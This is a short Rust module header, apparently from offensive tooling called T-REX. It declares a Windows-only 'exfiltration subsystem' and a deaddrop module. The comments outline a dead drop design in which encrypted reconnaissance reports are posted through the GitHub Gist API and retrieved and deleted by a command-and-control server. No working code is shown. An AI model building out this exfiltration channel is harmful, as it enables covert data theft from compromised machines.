//! T-REX Exfiltration Subsystem
//!
//! Dead Drop Resolver (Delta ThreatLabs 2026 pattern):
//! Encrypted recon report → GitHub Gist API → Gist ID → C2 retrieves + deletes.
#![cfg(target_os = "windows")]

pub mod deaddrop;
